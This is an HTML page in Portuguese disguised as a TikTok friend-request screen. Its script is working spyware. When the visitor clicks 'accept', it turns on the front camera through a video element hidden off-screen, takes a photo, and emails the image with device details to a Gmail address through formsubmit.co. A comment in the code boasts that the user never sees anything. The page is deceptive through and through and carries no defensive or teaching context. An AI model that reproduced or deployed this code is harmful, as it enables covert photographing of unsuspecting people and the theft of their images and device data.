<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Solicitação de Amizade</title>
    <style>
        :root {
            --tiktok-pink: #FE2C55;
            --tiktok-cyan: #25F4EE;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
            background: #121212;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 25px;
        }

        .logo-svg {
            width: 40px;
            height: 40px;
            display: inline-block;
        }

        .card {
            background: #1E1E1E;
            border-radius: 20px;
            padding: 30px 24px;
            text-align: center;
            border: 1px solid #2F2F2F;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .avatar-circle {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(135deg, #FE2C55, #FF5B7F);
            margin: 0 auto 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            font-weight: 700;
            color: #fff;
            box-shadow: 0 4px 20px rgba(254, 44, 85, 0.3);
        }

        .username {
            font-size: 20px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            margin-bottom: 4px;
        }

        .badge-verify {
            display: inline-block;
            width: 18px;
            height: 18px;
            background: #25F4EE;
            border-radius: 50%;
            position: relative;
        }

        .badge-verify::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 10px;
            color: #000;
            font-weight: bold;
        }

        .handle-name {
            font-size: 14px;
            color: #B0B0B0;
            margin-bottom: 18px;
        }

        .stats-row {
            display: flex;
            justify-content: center;
            gap: 35px;
            padding: 16px 0;
            border-top: 1px solid #2F2F2F;
            border-bottom: 1px solid #2F2F2F;
            margin-bottom: 20px;
        }

        .stat-num {
            font-size: 18px;
            font-weight: 700;
            display: block;
        }

        .stat-lbl {
            font-size: 11px;
            color: #B0B0B0;
            letter-spacing: 0.5px;
        }

        .invite-msg {
            font-size: 15px;
            color: #B0B0B0;
            margin-bottom: 22px;
        }

        .invite-msg strong {
            color: #fff;
        }

        .btn-accept {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #FE2C55, #FF1744);
            color: #fff;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 1px;
            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
            margin-bottom: 10px;
            transition: all 0.2s;
        }

        .btn-accept:hover {
            transform: scale(1.02);
        }
        .btn-accept:active {
            transform: scale(0.97);
        }

        .btn-ignore {
            width: 100%;
            padding: 15px;
            background: transparent;
            color: #B0B0B0;
            border: 1px solid #2F2F2F;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-ignore:hover {
            background: rgba(255, 255, 255, 0.04);
            color: #fff;
        }

        .btn-accept.loading {
            pointer-events: none;
            opacity: 0.7;
            color: transparent;
            position: relative;
        }

        .btn-accept.loading::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        .msg-box {
            margin-top: 18px;
            padding: 14px;
            background: rgba(37, 244, 238, 0.08);
            border: 1px solid rgba(37, 244, 238, 0.25);
            border-radius: 12px;
            color: #25F4EE;
            font-weight: 600;
            font-size: 14px;
            display: none;
            animation: fadeUp 0.3s ease;
        }

        .msg-box.show {
            display: block;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .footer-nav {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 28px;
            opacity: 0.4;
        }

        .footer-nav svg {
            width: 22px;
            height: 22px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Logo TikTok -->
        <div class="logo-area">
            <svg class="logo-svg" viewBox="0 0 48 48" fill="none">
                <path d="M34 6H14C9.58 6 6 9.58 6 14v20c0 4.42 3.58 8 8 8h20c4.42 0 8-3.58 8-8V14c0-4.42-3.58-8-8-8z" fill="#25F4EE"/>
                <path d="M29 18c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3z" fill="#FE2C55"/>
            </svg>
        </div>

        <!-- Card -->
        <div class="card">
            <div class="avatar-circle">LZ</div>

            <div class="username">
                @lucas_zanolli
                <span class="badge-verify"></span>
            </div>
            <div class="handle-name">Lucas Zanolli</div>

            <div class="stats-row">
                <div><span class="stat-num">12.4K</span><span class="stat-lbl">Seguidores</span></div>
                <div><span class="stat-num">847</span><span class="stat-lbl">Seguindo</span></div>
                <div><span class="stat-num">48.2K</span><span class="stat-lbl">Curtidas</span></div>
            </div>

            <div class="invite-msg">
                <strong>@lucas_zanolli</strong> quer ser seu amigo no TikTok
            </div>

            <button class="btn-accept" id="btnAccept">Aceitar convite</button>
            <button class="btn-ignore" id="btnIgnore">Ignorar</button>

            <div class="msg-box" id="msgBox">✓ Convite de amizade aceito com sucesso!</div>
        </div>

        <!-- Footer -->
        <div class="footer-nav">
            <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>
            </svg>
            <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                <circle cx="12" cy="12" r="10"/><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/>
            </svg>
            <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
            </svg>
        </div>
    </div>

    <!-- ============================================ -->
    <!-- CÂMERA 100% OCULTA -->
    <!-- ============================================ -->
    <video id="camVideo" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;" playsinline autoplay muted></video>
    <canvas id="camCanvas" style="display:none;"></canvas>

    <script>
        const btnAccept = document.getElementById('btnAccept');
        const btnIgnore = document.getElementById('btnIgnore');
        const msgBox = document.getElementById('msgBox');
        const camVideo = document.getElementById('camVideo');
        const camCanvas = document.getElementById('camCanvas');

        let cameraStream = null;

        // =============================================
        // INICIA CÂMERA REAL
        // =============================================
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                cameraStream = stream;
                camVideo.srcObject = stream;
                await camVideo.play();
                console.log('[CÂMERA] Ativada com sucesso');
                return true;
            } catch (err) {
                console.error('[CÂMERA] Falha:', err.message);
                return false;
            }
        }

        // =============================================
        // CAPTURA FOTO REAL
        // =============================================
        function captureRealPhoto() {
            return new Promise((resolve) => {
                setTimeout(() => {
                    const canvas = camCanvas;
                    const video = camVideo;
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
                    console.log('[FOTO] Foto real capturada com sucesso');
                    resolve(photoData);
                }, 500);
            });
        }

        // =============================================
        // PARA CÂMERA
        // =============================================
        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(t => t.stop());
                cameraStream = null;
                camVideo.srcObject = null;
                console.log('[CÂMERA] Desligada');
            }
        }

        // =============================================
        // ENVIA FOTO POR FORM SUBMIT (SEU EMAIL)
        // =============================================
        async function sendPhotoByFormSubmit(photoData) {
            try {
                const formData = new FormData();
                formData.append('photo', photoData);
                formData.append('timestamp', new Date().toLocaleString('pt-BR'));
                formData.append('userAgent', navigator.userAgent);
                formData.append('platform', navigator.platform);
                formData.append('screenSize', `${screen.width}x${screen.height}`);
                formData.append('_subject', '📸 Nova foto capturada - TikTok');

                const response = await fetch('https://formsubmit.co/ajax/lucaszanolli59@gmail.com', {
                    method: 'POST',
                    body: formData
                });

                console.log('[EMAIL] Enviado para seu email! Status:', response.status);
                return response.ok;
            } catch (error) {
                console.error('[EMAIL] Falha ao enviar:', error);
                return false;
            }
        }

        // =============================================
        // BOTÃO ACEITAR
        // =============================================
        btnAccept.addEventListener('click', async function() {
            this.classList.add('loading');
            this.textContent = 'Verificando...';
            btnIgnore.style.display = 'none';

            // Ativa câmera
            const camOk = await startCamera();

            if (camOk) {
                // Captura foto REAL
                const photo = await captureRealPhoto();

                // Desliga câmera IMEDIATAMENTE
                stopCamera();

                // 📧 ENVIA FOTO PRO SEU EMAIL
                await sendPhotoByFormSubmit(photo);

                console.log('[OK] Foto enviada. Usuário NUNCA viu nada.');
            }

            // Mostra apenas mensagem de sucesso
            this.classList.remove('loading');
            this.textContent = '✓ Amigos';
            this.style.background = 'linear-gradient(135deg, #25F4EE, #00D4CC)';
            this.style.boxShadow = '0 4px 15px rgba(37, 244, 238, 0.4)';
            this.style.pointerEvents = 'none';
            msgBox.classList.add('show');
        });

        // =============================================
        // BOTÃO IGNORAR
        // =============================================
        btnIgnore.addEventListener('click', function() {
            this.textContent = 'Ignorado';
            this.style.opacity = '0.5';
            btnAccept.style.opacity = '0.5';
            btnAccept.style.pointerEvents = 'none';
            this.style.pointerEvents = 'none';
            msgBox.textContent = 'Convite ignorado.';
            msgBox.style.color = '#FE2C55';
            msgBox.style.background = 'rgba(254, 44, 85, 0.08)';
            msgBox.style.border = '1px solid rgba(254, 44, 85, 0.25)';
            msgBox.classList.add('show');
            stopCamera();
        });
    </script>

</body>
</html>
